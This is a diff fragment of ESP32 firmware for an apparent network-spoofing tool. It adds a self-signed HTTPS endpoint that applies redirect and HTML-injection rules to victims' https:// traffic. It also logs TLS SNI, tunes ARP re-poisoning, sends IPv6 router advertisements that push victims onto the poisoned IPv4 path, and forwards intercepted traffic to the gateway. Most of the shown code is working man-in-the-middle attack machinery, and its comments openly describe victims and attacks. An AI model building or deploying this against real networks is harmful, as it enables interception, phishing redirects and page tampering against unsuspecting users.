+                        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
+                        out[i] = c;
+                    }
+                    out[n] = '\0';
+                    return n > 0;
+                }
+                q += nlen;
+            }
+        }
+        p += elen;
+    }
+    return false;
+}
+
+/**
+ * @brief A TLS connection to a remote address: record its SNI, then reset it.
+ *
+ * This is the cached-IP / secure-DNS case: the client never asked us for the
+ * address, so it is not talking to this board's TLS endpoint and a redirect
+ * cannot be forged. Logging the host and failing the connection is the honest
+ * result; when the DNS answer did point here the connection is delivered to the
+ * secure server instead and never reaches this function.
+ */
+static void _handleTls(NetSpoofSlot *slot) {
+    char sni[80] = {0};
+    bool have = _tlsSni(slot->data, slot->copyLen, sni, sizeof(sni));
+    String m = _macStr(slot->clientMac);
+    _capturePushEx(
+        NETSPOOF_CAPTURE_HTTPS, slot->srcIp, m.c_str(), "TLS", have ? sni : "", "",
+        have ? "ClientHello" : "ClientHello (no SNI)", 0
+    );
+    uint32_t ack = slot->seq + slot->payloadLen;
+    _txTcpRaw(
+        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x14,
+        NULL, 0
+    );
+}
+
+/// A non-HTTP TCP flow: reset it so the client fails fast instead of hanging.
+static void _handleOtherTcp(NetSpoofSlot *slot) {
+    uint32_t ack = slot->seq + slot->payloadLen;
+    _txTcpRaw(
+        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x14,
+        NULL, 0
+    );
 }
 
 // ===========================================================================
@@ -1431,7 +2437,6 @@ static void _handleHttp(NetSpoofSlot *slot) {
 static void _svcLoop(void *arg) {
     (void)arg;
     uint32_t lastPoison = 0;
-    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];
 
     while (s_svcRun) {
         NetSpoofSlot *slot = _slotTake();
@@ -1439,7 +2444,11 @@ static void _svcLoop(void *arg) {
             if (slot->kind == 0) {
                 if (s_dnsActive) _handleDns(slot);
             } else if (slot->kind == 2) {
-                if (s_httpActive) _handleSyn(slot);
+                if (s_httpActive || s_httpsActive) _handleSyn(slot);
+            } else if (slot->kind == 3) {
+                if (s_httpActive || s_httpsActive) _handleTls(slot);
+            } else if (slot->kind == 4) {
+                if (s_httpActive || s_httpsActive) _handleOtherTcp(slot);
             } else {
                 if (s_httpActive) _handleHttp(slot);
             }
@@ -1447,11 +2456,39 @@ static void _svcLoop(void *arg) {
         }
 
         uint32_t now = millis();
-        if (now - lastPoison >= NETSPOOF_POISON_INTERVAL_MS) {
+        int livePairs = _pairCountNow();
+        // Re-poison period scales with the pair count. Two ARP frames per pair
+        // every 250 ms is 1600 frames/s of airtime at 200 pairs, which starves
+        // the very traffic it is supposed to carry; one pass per ~1.8 s still
+        // refreshes every cache well inside the 20 s ARP entry timeout.
+        uint32_t poisonPeriod = NETSPOOF_POISON_INTERVAL_MS + (uint32_t)livePairs * 8;
+        if (now - lastPoison >= poisonPeriod) {
             lastPoison = now;
-            int n = 0;
-            _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
-            for (int i = 0; i < n; i++) _poisonPair(snapshot[i], 1);
+            for (int i = 0; i < livePairs; i++) {
+                NetSpoofPair p;
+                if (_pairCopy(i, &p)) _poisonPair(p, 1);
+            }
+        }
+
+        // Keep IPv6 retired for the poisoned clients: a modern device with a
+        // working IPv6 default route resolves and streams over it, and none of
+        // that traffic ever reaches the IPv4 poison. The RA is unicast to each
+        // victim, so no other host on the network is affected. It runs whenever
+        // something is being intercepted, not only while forwarding: a
+        // DNS-only attack (or a payload whose `forward auto` failed) is exactly
+        // the case where the victim's IPv6 resolver would keep answering every
+        // name for real, and the RA also carries the RDNSS lifetime 0 that makes
+        // Android fall back to its IPv4 resolver - without that, `https://`
+        // names never reached this engine at all.
+        if (s_forwardActive || s_dnsActive || s_httpsActive) {
+            static uint32_t lastRa = 0;
+            if (now - lastRa >= (uint32_t)(1500 + livePairs * 10)) {
+                lastRa = now;
+                for (int i = 0; i < livePairs; i++) {
+                    NetSpoofPair p;
+                    if (_pairCopy(i, &p)) _sendRaRetire(p.targetMac, p.gatewayMac);
+                }
+            }
         }
 
         vTaskDelay(pdMS_TO_TICKS(NETSPOOF_SVC_TICK_MS));
@@ -1474,7 +2511,7 @@ static void _svcStart() {
 }
 
 static void _svcStopIfIdle() {
-    if (s_svcTask && !netspoof_arp_active() && !s_dnsActive && !s_httpActive) {
+    if (s_svcTask && !netspoof_arp_active() && !s_dnsActive && !s_httpActive && !s_httpsActive) {
         s_svcRun = false;
     }
 }
@@ -1565,6 +2602,11 @@ bool netspoof_dns_start(String &err) {
 
 bool netspoof_dns_stop(String &err) {
     (void)err;
+    // The HTTPS endpoint answers every A record with this board's address, so
+    // it owns an active DNS responder for as long as it runs. Stopping DNS
+    // underneath it would silently break every HTTPS redirect; HTTPS stop
+    // releases the responder when it no longer needs it.
+    if (s_httpsActive) return true;
     s_dnsActive = false;
     if (!s_httpActive) _hookUninstall();
     _svcStopIfIdle();
@@ -1610,8 +2652,93 @@ static bool _httpAddRule(NetSpoofRule *list, int &count, const String &pattern, 
     return true;
 }
 
+/// Host part of a URL ("https://www.youtube.com:443/watch?x=1" ->
+/// "www.youtube.com").
+static String _urlHost(const String &url) {
+    int p = url.indexOf("://");
+    int start = (p >= 0) ? p + 3 : 0;
+    int end = url.length();
+    for (int i = start; i < (int)url.length(); i++) {
+        char c = url[i];
+        if (c == '/' || c == ':' || c == '?' || c == '#') {
+            end = i;
+            break;
+        }
+    }
+    String h = url.substring(start, end);
+    h.trim();
+    h.toLowerCase();
+    return h;
+}
+
+void netspoof_dns_add_passthrough(const String &host) {
+    String h = host;
+    h.trim();
+    h.toLowerCase();
+    if (h.length() == 0) return;
+    for (int i = 0; i < s_passCount; i++) {
+        if (s_passHosts[i] == h) return;
+    }
+    if (s_passCount < NETSPOOF_DNS_PASS_MAX) s_passHosts[s_passCount++] = h;
+    else s_passHosts[NETSPOOF_DNS_PASS_MAX - 1] = h; // newest wins
+}
+
+void netspoof_dns_clear_passthrough() { s_passCount = 0; }
+
+// --- transparent forwarding API -------------------------------------------
+
+bool netspoof_forward_start(String &err) {
+    if (!WiFi.isConnected()) {
+        err = "forwarding needs the station link";
+        return false;
+    }
+    IPAddress gw;
+    uint8_t mac[6];
+    if (!netspoof_gateway_info(gw, mac)) {
+        err = "gateway unknown (ARP table empty)";
+        return false;
+    }
+    // `netspoof_gateway_info()` falls back to the AP's BSSID, which is its
+    // Wi-Fi address - not the router's LAN MAC. Forwarding a victim frame there
+    // never reaches the gateway, so force a real ARP resolution first and treat
+    // a failure as "no forwarding" (the payload then falls back to its page).
+    uint8_t resolved[6];
+    if (netspoof_resolve_mac(gw, resolved, 1500)) {
+        memcpy(mac, resolved, 6);
+    } else {
+        err = "gateway MAC unresolved (no ARP answer)";
+        return false;
+    }
+    memcpy(s_gwMac, mac, 6);
+    s_gwMacOk = true;
+    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
+    _fwdPeersClear();
+    s_forwardActive = true;
+    Serial.printf("[NETSPOOF] forwarding ON via %s\n", _macStr(s_gwMac).c_str());
+    return true;
+}
+
+void netspoof_forward_stop() {
+    if (!s_forwardActive) return;
+    s_forwardActive = false;
+    s_gwMacOk = false;
+    _fwdPeersClear();
+    Serial.printf(
+        "[NETSPOOF] forwarding OFF (%lu frames, %lu bytes, %lu failed)\n", (unsigned long)s_fwdFrames,
+        (unsigned long)s_fwdBytes, (unsigned long)s_fwdDropped
+    );
+}
+
+bool netspoof_forward_active() { return s_forwardActive; }
+uint32_t netspoof_forward_frames() { return s_fwdFrames; }
+uint32_t netspoof_forward_dropped() { return s_fwdDropped; }
+
 bool netspoof_http_add_redirect(const String &pattern, const String &url, bool wildcard, String &err) {
-    return _httpAddRule(s_redirRules, s_redirCount, pattern, url, wildcard, err);
+    bool ok = _httpAddRule(s_redirRules, s_redirCount, pattern, url, wildcard, err);
+    // The host the redirect points at has to keep resolving for real, or the
+    // client is sent back to this board (which cannot fetch it) and loops.
+    if (ok) netspoof_dns_add_passthrough(_urlHost(url));
+    return ok;
 }
 
 bool netspoof_http_add_injection(const String &pattern, const String &html, bool wildcard, String &err) {
@@ -1669,6 +2796,15 @@ bool netspoof_http_start(String &err) {
     _svcStart();
     _hookInstall();
     s_httpActive = true;
+
+    // The plaintext interceptor works on its own; the HTTPS endpoint is what
+    // makes the same rules apply to https:// too. A TLS start failure (usually
+    // RAM) must not take the plaintext path down with it.
+    String httpsErr;
+    if (!netspoof_https_start(httpsErr)) {
+        Serial.printf("[NETSPOOF] https unavailable: %s\n", httpsErr.c_str());
+    }
+
     // No rules is allowed: the interceptor then only records what it sees.
     err = "";
     return true;
@@ -1676,6 +2812,8 @@ bool netspoof_http_start(String &err) {
 
 bool netspoof_http_stop(String &err) {
     (void)err;
+    String httpsErr;
+    netspoof_https_stop(httpsErr);
     s_httpActive = false;
     if (!s_dnsActive) _hookUninstall();
     _svcStopIfIdle();
@@ -1683,10 +2821,231 @@ bool netspoof_http_stop(String &err) {
 }
 
 // ===========================================================================
+// 8b. HTTPS endpoint (self-signed TLS, same rules as HTTP)
+// ===========================================================================
+
+uint16_t netspoof_https_port() { return NETSPOOF_HTTPS_PORT; }
+
+/// HTTP method name for a httpd request (HTTP_ANY handlers see every method).
+static const char *_httpsMethodName(int method) {
+    switch (method) {
+        case HTTP_GET: return "GET";
+        case HTTP_POST: return "POST";
+        case HTTP_PUT: return "PUT";
+        case HTTP_DELETE: return "DELETE";
+        case HTTP_HEAD: return "HEAD";
+        case HTTP_OPTIONS: return "OPTIONS";
+        case HTTP_PATCH: return "PATCH";
+        case HTTP_TRACE: return "TRACE";
+        case HTTP_CONNECT: return "CONNECT";
+        default: return "HTTP";
+    }
+}
+
+/**
+ * @brief Record one HTTPS request, including the peer address.
+ *
+ * httpd does not expose the peer address on the request object, so it is read
+ * from the accepted socket and mapped back to a MAC through the ARP table (the
+ * MAC is cosmetic; the IP is the useful part).
+ */
+static void _httpsPushCapture(
+    httpd_req_t *req, const char *method, const String &host, const String &path, uint8_t action
+) {
+    uint32_t ipWire = 0;
+    char macStr[18] = "00:00:00:00:00:00";
+    int fd = httpd_req_to_sockfd(req);
+    if (fd >= 0) {
+        struct sockaddr_in sa;
+        socklen_t sl = sizeof(sa);
+        memset(&sa, 0, sizeof(sa));
+        if (getpeername(fd, (struct sockaddr *)&sa, &sl) == 0 && sa.sin_family == AF_INET) {
+            ipWire = sa.sin_addr.s_addr;
+            IPAddress peer(ipWire);
+            uint8_t mac[6];
+            if (_arpTableLookup(peer, mac) && !_isZeroMac(mac)) {
+                String m = _macStr(mac);
+                strncpy(macStr, m.c_str(), sizeof(macStr) - 1);
+            }
+        }
+    }
+    // The client has been served: its next lookups (the target page and its
+    // assets) must resolve for real or the page it was sent to cannot load.
+    if (action && ipWire) _markServedIp(IPAddress(ipWire));
+
+    String reqLine = String(method) + " " + path + " HTTP/1.1";
+    _capturePushEx(
+        NETSPOOF_CAPTURE_HTTPS, ipWire, macStr, method, host.c_str(), path.c_str(), reqLine.c_str(), action
+    );
+}
+
+/**
+ * @brief Catch-all handler for the HTTPS endpoint.
+ *
+ * Applies the same redirect/injection rules as the plaintext interceptor, so a
+ * `redirect * http://...` payload now covers an https:// request as well. The
+ * TLS layer has already presented the self-signed certificate by the time this
+ * runs; the client has either accepted the warning or does not validate.
+ */
+static esp_err_t _httpsHandler(httpd_req_t *req) {
+    if (!s_httpsActive) {
+        httpd_resp_set_status(req, "503 Service Unavailable");
+        httpd_resp_send(req, "not running", 11);
+        return ESP_OK;
+    }
+
+    String host;
+    char hostBuf[64];
+    if (httpd_req_get_hdr_value_str(req, "Host", hostBuf, sizeof(hostBuf)) == ESP_OK) {
+        host = hostBuf;
+        host.trim();
+    }
+    host.toLowerCase();
+
+    String path = req->uri[0] ? req->uri : "/";
+    if (path.length() > 95) path = path.substring(0, 95); // capture field width
+    const char *method = _httpsMethodName(req->method);
+    String url = "https://" + host + path;
+
+    NetSpoofWebDecision d;
+    _webDecide(host, url, d);
+
+    s_httpsRequests++;
+    if (d.redirect < 0 && d.inject < 0) {
+        _httpsPushCapture(req, method, host, path, 0);
+        httpd_resp_set_status(req, "404 Not Found");
+        httpd_resp_set_type(req, "text/plain; charset=utf-8");
+        httpd_resp_send(req, "no rule", 7);
+        return ESP_OK;
+    }
+
+    if (d.redirect >= 0) {
+        _httpsPushCapture(req, method, host, path, 1);
+        httpd_resp_set_status(req, "302 Found");
+        httpd_resp_set_hdr(req, "Location", d.location.c_str());
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_send(req, NULL, 0);
+        s_httpsRedirected++;
+    } else {
+        _httpsPushCapture(req, method, host, path, 2);
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html; charset=utf-8");
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_send(req, d.html.c_str(), d.html.length());
+        s_httpsInjected++;
+    }
+    return ESP_OK;
+}
+
+bool netspoof_https_start(String &err) {
+    if (s_httpsActive) return true;
+    if (!netspoof_wifi_ready(err)) return false;
+
+    // The TLS record buffers must come from PSRAM here; see the allocator note
+    // above. Set before httpd_ssl_start() parses the certificate and creates
+    // the first SSL context.
+    _ensureMbedtlsPsram();
+    _ensure_mutex();
+
+    httpd_ssl_config_t cfg = HTTPD_SSL_CONFIG_DEFAULT();
+    cfg.servercert = (const uint8_t *)NETSPOOF_HTTPS_CERT;
+    cfg.servercert_len = sizeof(NETSPOOF_HTTPS_CERT);
+    cfg.prvtkey_pem = (const uint8_t *)NETSPOOF_HTTPS_KEY;
+    cfg.prvtkey_len = sizeof(NETSPOOF_HTTPS_KEY);
+    cfg.port_secure = NETSPOOF_HTTPS_PORT;
+    cfg.transport_mode = HTTPD_SSL_TRANSPORT_SECURE;
+    cfg.tls_handshake_timeout_ms = 8000;
+
+    // One TLS socket is ~40 KB of internal RAM. Keep the pool at one (clients
+    // are still accepted back-to-back) so the MITM engine and the Wi-Fi driver
+    // keep their headroom; lru_purge evicts a stuck handshake rather than
+    // exhausting the pool.
+    cfg.httpd.max_open_sockets = 1;
+    cfg.httpd.stack_size = 12288;
+    cfg.httpd.core_id = tskNO_AFFINITY;
+    cfg.httpd.lru_purge_enable = true;
+    cfg.httpd.recv_wait_timeout = 5;
+    cfg.httpd.send_wait_timeout = 5;
+    cfg.httpd.uri_match_fn = httpd_uri_match_wildcard;
+
+    esp_err_t e = httpd_ssl_start(&s_httpsServer, &cfg);
+    if (e != ESP_OK) {
+        s_httpsServer = NULL;
+        err = String("https server start failed: ") + esp_err_to_name(e);
+        return false;
+    }
+
+    httpd_uri_t uri = {};
+    uri.uri = "/*";
+    uri.method = (httpd_method_t)HTTP_ANY;
+    uri.handler = _httpsHandler;
+    uri.user_ctx = NULL;
+    e = httpd_register_uri_handler(s_httpsServer, &uri);
+    if (e != ESP_OK) {
+        httpd_ssl_stop(s_httpsServer);
+        s_httpsServer = NULL;
+        err = String("https handler registration failed: ") + esp_err_to_name(e);
+        return false;
+    }
+
+    s_httpsActive = true;
+    // The victim must be able to reach this endpoint, so the DNS responder has
+    // to run even when the payload has no `dns` line. If it was already up,
+    // leave ownership alone and the user's rules survive HTTPS stopping.
+    _svcStart();
+    _hookInstall();
+    if (!s_dnsActive) {
+        s_dnsActive = true;
+        s_httpsOwnsDns = true;
+    }
+    Serial.printf(
+        "[NETSPOOF] https endpoint on :%d (self-signed; clients must accept the warning)\n",
+        NETSPOOF_HTTPS_PORT
+    );
+    err = "";
+    return true;
+}
+
+bool netspoof_https_stop(String &err) {
+    (void)err;
+    if (s_httpsServer) {
+        httpd_ssl_stop(s_httpsServer);
+        s_httpsServer = NULL;
+    }
+    bool was = s_httpsActive;
+    s_httpsActive = false;
+    if (s_httpsOwnsDns) {
+        s_httpsOwnsDns = false;
+        if (!s_httpActive) s_dnsActive = false;
+    }
+    if (!s_httpActive && !s_dnsActive) _hookUninstall();
+    _svcStopIfIdle();
+    if (was) Serial.println("[NETSPOOF] https endpoint stopped");
+    return true;
+}
+
+bool netspoof_https_active() { return s_httpsActive; }
+uint32_t netspoof_https_requests() { return s_httpsRequests; }
+uint32_t netspoof_https_redirected() { return s_httpsRedirected; }
+uint32_t netspoof_https_injected() { return s_httpsInjected; }
+
+// ===========================================================================
 // 9. Captures
 // ===========================================================================
 
 int netspoof_capture_count() { return s_captureCount; }
+
+uint32_t netspoof_capture_total() { return s_captureTotal; }
+
+const char *netspoof_capture_kind_name(uint8_t kind) {
+    switch (kind) {
+        case NETSPOOF_CAPTURE_DNS: return "dns";
+        case NETSPOOF_CAPTURE_HTTPS: return "https";
+        default: return "http";
+    }
+}
 
 const NetSpoofCapture *netspoof_capture(int idx) {
     NetSpoofCapture *ring = s_captures();
@@ -1701,6 +3060,10 @@ void netspoof_capture_clear() { s_captureCount = 0; }
 // ===========================================================================
 
 void netspoof_cleanup() {
+    String httpsErr;
+    netspoof_forward_stop();
+    netspoof_dns_clear_passthrough();
+    netspoof_https_stop(httpsErr);
     s_dnsActive = false;
     s_httpActive = false;
     _hookUninstall();
